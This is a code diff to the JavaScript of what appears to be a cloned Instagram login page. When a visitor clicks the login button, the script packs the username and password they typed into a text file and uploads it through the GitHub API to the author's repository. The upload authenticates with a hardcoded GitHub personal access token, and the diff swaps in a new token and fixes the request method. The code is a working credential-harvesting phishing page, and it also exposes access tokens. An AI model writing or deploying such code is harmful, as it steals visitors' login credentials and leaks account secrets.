@@ -10,7 +10,7 @@ document.querySelector('.loginButton').addEventListener('click', () => {
         const owner = 'Arnav-lunatic'
         const repo = 'insta-login-clone'
         const path = 'info.txt'
-        const token = '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'
+        const token = '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'
 
         let blob = new Blob([`username - "${username.value}" | password - "${password.value}"`],
                 { type: "text/plain" });
@@ -18,12 +18,10 @@ document.querySelector('.loginButton').addEventListener('click', () => {
         const formData = new FormData();
         formData.append("file", blob, path);
 
-        console.log(formData, blob);
-
         fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`, {
-            method: "POST",
+            method: "PUT",
             headers: {
-                authorization: `token ${token}`,
+                Authorization: `token ${token}`,
             },
             body: formData,
         }).then((response) => {
